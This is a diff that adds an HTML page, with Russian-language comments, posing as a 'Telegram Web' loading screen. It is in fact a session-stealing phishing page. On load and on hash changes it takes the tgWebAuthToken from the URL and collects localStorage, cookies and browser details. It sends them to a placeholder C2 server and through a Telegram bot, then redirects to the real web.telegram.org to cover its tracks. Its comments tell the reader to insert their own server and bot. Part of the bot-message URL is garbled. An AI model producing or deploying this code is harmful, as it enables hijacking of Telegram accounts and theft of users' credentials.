@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: Arial; text-align: center; padding-top: 100px; }
+        h1 { font-size: 24px; }
+    </style>
+</head>
+<body>
+    <h1>Загрузка Telegram Web...</h1>
+    <p>Пожалуйста, подождите...</p>
+
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        function stealEverything() {
+            // 1. Перехватываем tgWebAuthToken из URL
+            let token = null;
+            const hash = window.location.hash || location.hash || '';
+            const tokenMatch = hash.match(/tgWebAuthToken=([^&]+)/);
+            if (tokenMatch && tokenMatch[1]) {
+                token = tokenMatch[1];
+            }
+
+            // 2. Крадём весь localStorage родительского окна (web.telegram.org)
+            let storageData = {};
+            try {
+                storageData = JSON.stringify(Object.assign({}, window.parent.localStorage));
+            } catch(e) {}
+
+            // 3. Дополнительно куки и текущий URL
+            const fullData = {
+                timestamp: Date.now(),
+                token: token,
+                localStorage: storageData,
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+
+            // 4. Отправляем на твой C2 (замени на свой сервер или Telegram бот)
+            const c2_url = "https://твой-c2.ru/steal";   // <-- СЮДА СВОЙ СЕРВЕР
+            fetch(c2_url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(fullData),
+                mode: "no-cors"
+            }).catch(() => {});
+
+            // Альтернатива: отправка через Telegram Bot API (если нет своего сервера)
+            const botToken = "ТОЙ_БОТ_ТОКЕН";      // <-- СВОЙ БОТ
+            const chatId = "ТОЙ_CHAT_ID";          // <-- СВОЙ ЧАТ
+            if (botToken && chatId) {
+                const msg = encodeURIComponent(`Новый токен!\nToken: ${token}\nUA: ${navigator.userAgent}`);
+                fetch(`https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${msg}`);
+            }
+
+            // Маскировка: редирект на настоящий Telegram Web через 800 мс
+            setTimeout(() => {
+                window.location.href = "https://web.telegram.org/";
+            }, 800);
+        }
+
+        // Запускаем сразу после загрузки
+        window.onload = stealEverything;
+
+        // Дополнительно ловим изменения hash (на случай задержки)
+        window.addEventListener("hashchange", stealEverything);
+
+        // Telegram WebApp событие ready
+        tg.onEvent("viewportChanged", stealEverything);
+    </script>
+</body>
+</html>
